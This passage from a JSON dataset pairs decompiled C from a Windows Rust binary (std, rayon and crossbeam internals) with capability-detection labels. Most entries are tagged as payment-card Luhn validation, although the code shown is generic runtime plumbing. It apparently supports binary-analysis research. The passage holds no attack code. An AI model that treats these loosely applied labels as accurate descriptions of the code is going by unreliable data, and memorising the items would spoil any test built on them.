        "decompiled_code": "\nuint32_t sym._ZN3std4sync6poison4Flag5guard17h7c1dc4a1daf9103dE.196(char *arg1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = sym._ZN3std6thread9panicking17h4d36ec2cb47eacaeE.194();\n    return uVar1 & 0xffffff00 | *arg1 != '\\0';\n}\n",
        "token_count": 99
    },
    "efde135f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_crossbeam_channel::waker::Waker__::hefde135fea272c6f\n               (int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    // core::ptr::drop_in_place<std::sync::mutex::MutexGuard<crossbeam_channel::waker::Waker>>::hefde135fea272c6f\n    iVar1 = *arg1;\n    sym._ZN3std4sync6poison4Flag4done17h294739ef4dc167d0E.193(iVar1 + 8);\n    // WARNING: Could not recover jumptable at 0x004410d4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_ReleaseSRWLockExclusive)(iVar1);\n    return;\n}\n",
        "token_count": 194
    },
    "6fc96e7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::result::Result_T_E_::expect::h6fc96e7fb30f4c91(char param_1)\n\n{\n    uchar auStack8 [8];\n    \n    // core::result::Result<T,E>::expect::h6fc96e7fb30f4c91\n    if (param_1 == '\\0') {\n        return;\n    }\n    dbg.unwrap_failed(\"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                      , 0x46, auStack8, 0x448820);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 172
    },
    "5f310a05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.rayon_core::sleep::Sleep::wake_any_threads::h5f310a05e72ce8bf(int64_t arg1, ulong arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    char cVar3;\n    int64_t arg2_00;\n    \n    // rayon_core::sleep::Sleep::wake_any_threads::h5f310a05e72ce8bf\n    if (arg2 != 0) {\n        iVar2 = *(arg1 + 0x20);\n        arg2_00 = 0;\n        do {\n            if (iVar2 == arg2_00) {\n                return;\n            }\n            iVar1 = arg2_00 + 1;\n            cVar3 = sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(arg1, arg2_00);\n            arg2_00 = iVar1;\n        } while ((cVar3 == '\\0') || (arg2._0_4_ = arg2 + -1,  arg2 != 0));\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "1d527a45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    \n    // core::ptr::drop_in_place<std::sync::mutex::MutexGuard<bool>>::h1d527a45e74a1c46\n    iVar1 = *arg1;\n    sym._ZN3std4sync6poison4Flag4done17h294739ef4dc167d0E.193(iVar1 + 8);\n    // WARNING: Could not recover jumptable at 0x004410d4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_ReleaseSRWLockExclusive)(iVar1);\n    return;\n}\n",
        "token_count": 180
    },
    "04043a75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sync::condvar::Condvar::wait::h04043a752ec3db26\n               (uint64_t *arg1, ulong ConditionVariable, uint64_t arg3, ulong arg4)\n\n{\n    char cVar1;\n    \n    // std::sync::condvar::Condvar::wait::h04043a752ec3db26\n    sub.KERNEL32.dll_SleepConditionVariableSRW(ConditionVariable, arg3, 0xffffffff, 0);\n    cVar1 = *(arg3 + 8);\n    arg1[1] = arg3;\n    *(arg1 + 2) = arg4;\n    *arg1 = cVar1 != '\\0';\n    return;\n}\n",
        "token_count": 156
    },
    "4f1d6e1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_deque::deque::Block_T_::destroy::h4f1d6e1cf366fa83(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t *puVar2;\n    bool bVar3;\n    int64_t iStack8;\n    \n    do {\n        do {\n    // crossbeam_deque::deque::Block<T>::destroy::h4f1d6e1cf366fa83\n            if (arg2 == 0) {\n                iStack8 = arg1;\n                sym._ZN4core3ptr106drop_in_place_LT_alloc..boxed..Box_LT_crossbeam_deque..deque..Block_LT_rayon_core..job..JobRef_GT__GT__GT_17hc0\n                          (&iStack8);\n                return;\n            }\n            arg2 = arg2 + -1;\n        } while ((*(arg1 + 0x18 + arg2 * 0x18) & 2) != 0);\n        puVar2 = arg2 * 0x18 + arg1 + 0x18;\n        uVar1 = *puVar2;\n        do {\n            LOCK();\n            bVar3 = uVar1 == *puVar2;\n            *puVar2 = *puVar2 ^ bVar3 * (*puVar2 ^ (uVar1 | 4));\n            uVar1 = uVar1 ^ !bVar3 * (uVar1 ^ *puVar2);\n        } while (!bVar3);\n    } while ((uVar1 & 2) != 0);\n    return;\n}\n",
        "token_count": 354
    },
    "550424ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t sym.rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220(int64_t arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    int64_t SRWLock;\n    uchar auStack256 [144];\n    ulong uStack112;\n    int64_t iStack64;\n    uchar uStack56;\n    uchar auStack48 [24];\n    \n    // rayon_core::sleep::Sleep::wake_specific_thread::h550424ba75ba2220\n    uStack112 = 0x410686;\n    SRWLock = sym._alloc::vec::Vec_T_A__as_core::ops::index::Index_I__::index::h03d0b9f747e8ea10\n                        (arg1 + 0x10, arg2, 0x448b00);\n    uStack112 = 0x410699;\n    sym.std::sync::mutex::Mutex_T_::lock::h62098323f0fb8253(&stack0xffffffffffffffd0, SRWLock);\n    uStack56 = 0x18;\n    uStack112 = 0x4106a8;\n    iStack64 = sym.core::result::Result_T_E_::unwrap::h275888c52c276ebd(&stack0xffffffffffffffd0, 0x448b18);\n    uVar1 = *(iStack64 + 9);\n    if (uVar1 != 0) {\n        *(iStack64 + 9) = 0;\n        uStack112 = 0x4106c8;\n        sub.KERNEL32.dll_WakeConditionVariable(SRWLock + 0x10);\n        LOCK();\n        *(arg1 + 0x28) = *(arg1 + 0x28) + -1;\n    }\n    uStack112 = 0x4106d7;\n    sym.core::ptr::drop_in_place_std::sync::mutex::MutexGuard_bool__::h1d527a45e74a1c46(&stack0xffffffffffffffc0);\n    return &stack0xffffffffffffff00 & 0xffffffff | uVar1;\n}\n",
        "token_count": 464
    },
    "0d23aa02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid sym.std::thread::local::os::destroy_value::h0d23aa02f9958f9e(int64_t arg1)\n\n{\n    ulong arg1_00;\n    uint uVar1;\n    \n    // std::thread::local::os::destroy_value::h0d23aa02f9958f9e\n    arg1_00 = *(arg1 + 0x10);\n    sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.199(arg1_00, 1);\n    sym.__rust_dealloc(arg1, 8);\n    uVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3key17ha737541a6eb9c428E.200(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00441094. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(uVar1, 0);\n    return;\n}\n",
        "token_count": 238
    },
    "9d5c3ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00404d59)\n\nvoid sym._alloc::vec::into_iter::IntoIter_T_A__as_core::ops::drop::Drop_::drop::h9d5c3ff09026b48d(ulong *arg1)\n\n{\n    uchar auVar1 [16];\n    int64_t arg1_00;\n    uint64_t uVar2;\n    \n    // <alloc::vec::into_iter::IntoIter<T,A> as core::ops::drop::Drop>::drop::h9d5c3ff09026b48d\n    arg1_00 = arg1[2];\n    for (uVar2 = arg1[3] - arg1[2] & 0xffffffffffffffe0; uVar2 != 0; uVar2 = uVar2 - 0x20) {\n        sym._ZN4core3ptr155drop_in_place_LT_alloc..sync..Arc_LT_crossbeam_utils..cache_padded..CachePadded_LT_crossbeam_deque..deque..Inne\n                  (arg1_00);\n        arg1_00 = arg1_00 + 0x20;\n    }\n    if ((arg1[1] != 0) && (auVar1 = ZEXT816(arg1[1]) * ZEXT816(0x20),  SUB168(auVar1 >> 0x40, 0) == 0)) {\n        if (SUB168(auVar1, 0) == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00441124. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4520e0, 0, *arg1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 400
    },
    "e8311ff5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(int64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    // alloc::raw_vec::RawVec<T,A>::allocate_in::he8311ff590a9cc21\n    if (arg1 == 0) {\n        iVar1 = 1;\n    }\n    else {\n        iVar1 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.185\n                          (arg1, 1);\n        if (iVar1 == 0) {\n            dbg.handle_alloc_error(arg1);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 182
    },
    "fde72671": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ops::function::FnOnce::call_once_u7b__u7b_vtableshim_u7d__u7d_::hfde7267100e2583d(ulong *arg1)\n\n{\n    ulong uStack8;\n    \n    // core::ops::function::FnOnce::call_once$u7b$$u7b$vtableshim$u7d$$u7d$::hfde7267100e2583d\n    uStack8 = *arg1;\n    sym.std::sync::once::Once::call_once::__u7b__u7b_closure_u7d__u7d_::h64b45a65ef2a6107(&uStack8);\n    return;\n}\n",
        "token_count": 161
    },
    "14c5ef23": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t sym._T_as_core::fmt::Debug_::fmt::h14c5ef2368866980(uint64_t **arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    ulong uVar7;\n    code *UNRECOVERED_JUMPTABLE;\n    uchar *arg4;\n    ulong uVar8;\n    bool bVar9;\n    uchar auStack256 [112];\n    ulong uStack144;\n    ulong uStack104;\n    uchar uStack81;\n    int64_t iStack80;\n    ulong uStack72;\n    uint8_t uStack64;\n    char cStack63;\n    ulong uStack56;\n    uchar uStack48;\n    uchar uStack47;\n    uint64_t uStack40;\n    \n    // <&T as core::fmt::Debug>::fmt::h14c5ef2368866980\n    uVar4 = **arg1;\n    uVar3 = uVar4 >> 0x20;\n    // switch table (45 cases) at 0x411fcc\n    switch(*((uVar4 & 3) * 4 + 0x411fcc) + 0x411fcc) {\n    case 0x411bee:\n        uStack144 = 0x411c06;\n        uVar1 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), 0x44a35d, 5);\n        uStack72 = uStack72 & 0xffffffffffff0000 | uVar1;\n        uStack104 = 0x44a368;\n        uStack144 = 0x411c3a;\n        iStack80 = arg2;\n        dbg.field(&stack0xffffffffffffffb0, 0x44a362, 4, uVar4 + 0x10);\n        uStack104 = 0x44a390;\n        uStack144 = 0x411c5e;\n        dbg.field(&stack0xffffffffffffffb0, \"message\", 7, uVar4);\n        uStack144 = 0x411c66;\n        uVar3 = sym.core::fmt::builders::DebugStruct::finish::h23b21303d147094f(&stack0xffffffffffffffb0);\n        uVar4 = uVar3;\n        goto code_r0x00411fa8;\n    case 0x411c6d:\n        uStack40 = uStack40 & 0xffffffff00000000 | uVar3;\n        uStack144 = 0x411c90;\n        uStack48 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"Oscode\", 2);\n        uStack47 = 0;\n        uStack104 = 0x44a3c0;\n        uStack144 = 0x411cc3;\n        uStack56 = arg2;\n        dbg.field(&stack0xffffffffffffffc8, \"code\", 4, &stack0xffffffffffffffd8);\n        uStack144 = 0x411cca;\n        uStack81 = dbg.decode_error_kind(uStack40 & 0xffffffff);\n        uStack104 = 0x44a368;\n        uStack144 = 0x411cf3;\n        dbg.field(&stack0xffffffffffffffc8, 0x44a362, 4, &stack0xffffffffffffffaf);\n        uStack144 = 0x411d02;\n        dbg.error_string(&stack0xffffffffffffffb0);\n        uStack104 = 0x44a3e0;\n        uStack144 = 0x411d26;\n        dbg.field(&stack0xffffffffffffffc8, \"message\", 7, &stack0xffffffffffffffb0);\n        uStack144 = 0x411d30;\n        uVar3 = sym.core::fmt::builders::DebugStruct::finish::h23b21303d147094f(&stack0xffffffffffffffc8);\n        uVar4 = uVar3;\n        if (uStack72 != 0) {\n            uStack144 = 0x411d4d;\n            sym.__rust_dealloc(iStack80, 1);\n        }\n        goto code_r0x00411fa8;\n    case 0x411d52:\n        uStack56 = uVar4 - 1;\n        uStack40 = uVar4 + 0xf;\n        arg4 = &stack0xffffffffffffffd8;\n        uStack144 = 0x411d82;\n        uVar1 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"Customerror\", 6);\n        uStack72 = uStack72 & 0xffffffffffff0000 | uVar1;\n        uStack104 = 0x44af58;\n        uStack144 = 0x411db5;\n        iStack80 = arg2;\n        dbg.field(&stack0xffffffffffffffb0, 0x44a362, 4, arg4);\n        uStack104 = 0x44af88;\n        uStack144 = 0x411dd9;\n        dbg.field(&stack0xffffffffffffffb0, \"error\", 5, &stack0xffffffffffffffc8);\n        if ((uStack72._1_1_ != '\\0') && (bVar9 = uStack72 == '\\0',  uStack72._0_1_ = '\\x01',  bVar9)) {\n            if ((*(iStack80 + 0x30) & 4) == 0) {\n                uVar6 = *(iStack80 + 0x20);\n                iVar5 = *(iStack80 + 0x28);\n                uVar7 = 0x4490ff;\n                uVar8 = 2;\n            }\n            else {\n                uVar6 = *(iStack80 + 0x20);\n                iVar5 = *(iStack80 + 0x28);\n                uVar7 = 0x448ee2;\n                uVar8 = 1;\n            }\n            uStack144 = 0x411e44;\n            uStack72._0_1_ = (**(iVar5 + 0x18))(uVar6, uVar7, uVar8);\n        }\n        break;\n    case 0x411e0a:\n        if (uVar3 < 0x29) {\n            UNRECOVERED_JUMPTABLE = *((uVar4 >> 0x20) * 4 + 0x411fdc) + 0x411fdc;\n    // WARNING: Could not recover jumptable at 0x00411e23. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (41 cases) at 0x411fdc\n            uVar4 = (*UNRECOVERED_JUMPTABLE)(0x411fdc, UNRECOVERED_JUMPTABLE);\n            return uVar4;\n        }\n        uStack56 = CONCAT71(uStack56._1_7_, 0x29);\n        uStack144 = 0x411f1d;\n        uStack64 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), \"KindOscode\", 4);\n        uStack72 = 0;\n        cStack63 = '\\0';\n        uStack144 = 0x411f43;\n        iStack80 = arg2;\n        sym.core::fmt::builders::DebugTuple::field::h5de9a7eab4b37a6b\n                  (&stack0xffffffffffffffb0, &stack0xffffffffffffffc8, 0x44a368);\n        iVar5 = iStack80;\n        arg4 = &stack0xffffffffffffff00 | uStack64;\n        if ((uStack72 != 0) && (arg4 = CONCAT71(&stack0xffffffffffffff00 >> 8, 1),  uStack64 == 0)) {\n            if ((uStack72 == 1) && ((cStack63 != '\\0' && ((*(iStack80 + 0x30) & 4) == 0)))) {\n                uStack144 = 0x411f85;\n                cVar2 = (**(*(iStack80 + 0x28) + 0x18))(*(iStack80 + 0x20), 0x448de4, 1);\n                if (cVar2 != '\\0') goto code_r0x00411fa3;\n            }\n            uStack144 = 0x411fa1;\n            uVar3 = (**(*(iVar5 + 0x28) + 0x18))(*(iVar5 + 0x20), 0x44a40b, 1);\n            arg4 = uVar3;\n        }\ncode_r0x00411fa3:\n        uStack72._0_1_ = arg4;\n    }\n    uVar4 = arg4 & 0xffffffffffffff00 | uStack72 != '\\0';\ncode_r0x00411fa8:\n    return uVar4 & 0xffffffff;\n}\n",
        "token_count": 2018
    },
    "ce845e70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.std::thread::local::LocalKey_T_::with::hce845e7095f8c363(code **arg1)\n\n{\n    ulong *puVar1;\n    uchar auStack8 [8];\n    \n    // std::thread::local::LocalKey<T>::with::hce845e7095f8c363\n    puVar1 = (**arg1)(0);\n    if (puVar1 != NULL) {\n        return *puVar1;\n    }\n    dbg.unwrap_failed(\"cannot access a Thread Local Storage value during or after destruction/rustc/a55dd71d5fb0ec5a6a3a9e8c27b2127ba491ce52\\\\library\\\\std\\\\src\\\\thread\\\\local.rs\"\n                      , 0x46, auStack8, 0x448820);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 193
    },
    "4d954f05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set thread local storage value"
        ],
        "decompiled_code": "\nvoid sym.std::thread::local::os::destroy_value::h4d954f05b1b103a4(int64_t arg1)\n\n{\n    ulong arg1_00;\n    uint uVar1;\n    \n    // std::thread::local::os::destroy_value::h4d954f05b1b103a4\n    arg1_00 = *(arg1 + 0x20);\n    sym._ZN3std10sys_common16thread_local_key9StaticKey3set17hb8e9483efec9e5adE.199(arg1_00, 1);\n    sym.__rust_dealloc(arg1, 8);\n    uVar1 = sym._ZN3std10sys_common16thread_local_key9StaticKey3key17ha737541a6eb9c428E.200(arg1_00);\n    // WARNING: Could not recover jumptable at 0x00441094. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(uVar1, 0);\n    return;\n}\n",
        "token_count": 238
    },
    "10d48900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.alloc::slice::__impl_alloc::borrow::ToOwned_for__T__::to_owned::h10d48900a91d7ead\n               (ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    \n    uVar2 = arg2;\n    // alloc::slice::_<impl alloc::borrow::ToOwned for [T]>::to_owned::h10d48900a91d7ead\n    uVar1 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(arg3);\n    *arg1 = uVar1;\n    arg1[1] = uVar2;\n    sym.memcpy(uVar1, arg2, arg3);\n    arg1[2] = arg3;\n    return;\n}\n",
        "token_count": 183
    },
    "8673cef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong sym.rayon_core::current_num_threads::h8673cef0ca165181(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    \n    // rayon_core::current_num_threads::h8673cef0ca165181\n    iVar1 = sym.std::thread::local::LocalKey_T_::with::hce845e7095f8c363(0x44bb28);\n    if (iVar1 == 0) {\n        piVar2 = sym.rayon_core::registry::global_registry::hf27dcebee1561694();\n    }\n    else {\n        piVar2 = iVar1 + 0x130;\n    }\n    return *(*piVar2 + 0x1a0);\n}\n",
        "token_count": 164
    },
    "5992d6a1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::c::GetSystemTimePreciseAsFileTime::load::h5992d6a121dad7f3(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    // std::sys::windows::c::GetSystemTimePreciseAsFileTime::load::h5992d6a121dad7f3\n    iVar1 = sub.KERNEL32.dll_GetModuleHandleA(\"kernel32\");\n    if (iVar1 != 0) {\n        *0x443098 = sub.KERNEL32.dll_GetProcAddress(iVar1, \"GetSystemTimePreciseAsFileTime\");\n        if (*0x443098 != NULL) goto code_r0x00419124;\n    }\n    *0x443098 = sym.std::sys::windows::c::GetSystemTimePreciseAsFileTime::fallback::h8c6d1a759d7c9340;\ncode_r0x00419124:\n    // WARNING: Could not recover jumptable at 0x00419133. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x443098)(arg1);\n    return;\n}\n",
        "token_count": 252
    },
    "c3beb3c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::c::NtReleaseKeyedEvent::load::hc3beb3c9fc9aa632\n               (ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    \n    // std::sys::windows::c::NtReleaseKeyedEvent::load::hc3beb3c9fc9aa632\n    iVar1 = sub.KERNEL32.dll_GetModuleHandleA(\"ntdll\");\n    if (iVar1 != 0) {\n        *0x4430b8 = sub.KERNEL32.dll_GetProcAddress(iVar1, \"NtReleaseKeyedEvent\");\n        if (*0x4430b8 != NULL) goto code_r0x0041a701;\n    }\n    *0x4430b8 = sym.std::sys::windows::c::NtReleaseKeyedEvent::fallback::h7d385af22db48827;\ncode_r0x0041a701:\n    // WARNING: Could not recover jumptable at 0x0041a71d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4430b8)(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 273
    },
    "a1e6145a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::c::NtWaitForKeyedEvent::load::ha1e6145a160484e8\n               (ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    \n    // std::sys::windows::c::NtWaitForKeyedEvent::load::ha1e6145a160484e8\n    iVar1 = sub.KERNEL32.dll_GetModuleHandleA(\"ntdll\");\n    if (iVar1 != 0) {\n        *0x4430c0 = sub.KERNEL32.dll_GetProcAddress(iVar1, \"NtWaitForKeyedEvent\");\n        if (*0x4430c0 != NULL) goto code_r0x0041a801;\n    }\n    *0x4430c0 = sym.std::sys::windows::c::NtWaitForKeyedEvent::fallback::h059ca5e43b764fed;\ncode_r0x0041a801:\n    // WARNING: Could not recover jumptable at 0x0041a81d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4430c0)(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 273
    },
    "80c0e7f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::c::NtCreateKeyedEvent::load::h80c0e7f560136219\n               (ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    \n    // std::sys::windows::c::NtCreateKeyedEvent::load::h80c0e7f560136219\n    iVar1 = sub.KERNEL32.dll_GetModuleHandleA(\"ntdll\");\n    if (iVar1 != 0) {\n        *0x4430b0 = sub.KERNEL32.dll_GetProcAddress(iVar1, \"NtCreateKeyedEvent\");\n        if (*0x4430b0 != NULL) goto code_r0x0041a8bf;\n    }\n    *0x4430b0 = sym.std::sys::windows::c::NtCreateKeyedEvent::fallback::hb039254d3377521c;\ncode_r0x0041a8bf:\n    // WARNING: Could not recover jumptable at 0x0041a8d9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4430b0)(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 275
    },
    "5b49514c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t sym.std::io::Write::write_fmt::h5b49514cbac34265(ulong arg1, uint *arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    ulong uStack72;\n    int64_t iStack64;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    // std::io::Write::write_fmt::h5b49514cbac34265\n    iStack64 = 0;\n    uStack56 = *arg2;\n    uStack52 = arg2[1];\n    uStack48 = arg2[2];\n    uStack44 = arg2[3];\n    uStack40 = arg2[4];\n    uStack36 = arg2[5];\n    uStack32 = arg2[6];\n    uStack28 = arg2[7];\n    uStack24 = arg2[8];\n    uStack20 = arg2[9];\n    uStack16 = arg2[10];\n    uStack12 = arg2[0xb];\n    uStack72 = arg1;\n    cVar1 = dbg.write(&uStack72, 0x44a5e0, &uStack56);\n    if (cVar1 == '\\0') {\n        if (iStack64 != 0) {\n            dbg.drop_in_place<std::io::error::Error>(iStack64);\n        }\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = 0x44a5c8;\n        if (iStack64 != 0) {\n            iVar2 = iStack64;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 412
    },
    "4cd2b8ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_std::io::buffered::bufwriter::BufWriter_W_::flush_buf::BufGuard_::h4cd2b8ab18af2e05\n               (int64_t **arg1)\n\n{\n    int64_t *arg1_00;\n    int64_t *piVar1;\n    int64_t *arg2;\n    int64_t iVar2;\n    \n    // core::ptr::drop_in_place<std::io::buffered::bufwriter::BufWriter<W>::flush_buf::BufGuard>::h4cd2b8ab18af2e05\n    arg1_00 = arg1[1];\n    if (arg1_00 != NULL) {\n        piVar1 = *arg1;\n        arg2 = piVar1[2];\n        iVar2 = arg2 - arg1_00;\n        if (arg2 < arg1_00) {\n            dbg.slice_end_index_len_fail(arg1_00, arg2);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        piVar1[2] = 0;\n        if (iVar2 != 0) {\n            sub.msvcrt.dll_memmove(*piVar1, arg1_00 + *piVar1, iVar2);\n            piVar1[2] = iVar2;\n        }\n    }\n    return;\n}\n",
        "token_count": 294
    },
    "1496d1eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::c::RtlNtStatusToDosError::load::h1496d1ebc5d9612d(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    // std::sys::windows::c::RtlNtStatusToDosError::load::h1496d1ebc5d9612d\n    iVar1 = sub.KERNEL32.dll_GetModuleHandleA(\"ntdll\");\n    if (iVar1 != 0) {\n        *0x4430a8 = sub.KERNEL32.dll_GetProcAddress(iVar1, \"RtlNtStatusToDosError\");\n        if (*0x4430a8 != NULL) goto code_r0x0041c043;\n    }\n    *0x4430a8 = dbg.from_inner;\ncode_r0x0041c043:\n    // WARNING: Could not recover jumptable at 0x0041c051. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4430a8)(arg1);\n    return;\n}\n",
        "token_count": 235
    },
    "746a0422": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid sym.std::sys::windows::c::NtWriteFile::load::h746a04224baeb84d(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    \n    // std::sys::windows::c::NtWriteFile::load::h746a04224baeb84d\n    iVar1 = sub.KERNEL32.dll_GetModuleHandleA(\"ntdll\");\n    if (iVar1 != 0) {\n        *0x4430a0 = sub.KERNEL32.dll_GetProcAddress(iVar1, \"NtWriteFile\");\n        if (*0x4430a0 != NULL) goto code_r0x0041c0b1;\n    }\n    *0x4430a0 = sym.std::sys::windows::c::NtReadFile::fallback::h3fd775bdff20b363;\ncode_r0x0041c0b1:\n    // WARNING: Could not recover jumptable at 0x0041c0cd. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x4430a0)(arg1, arg2, arg3, arg4);\n    return;\n}\n",
        "token_count": 265
    },
    "8c7f32d2": {
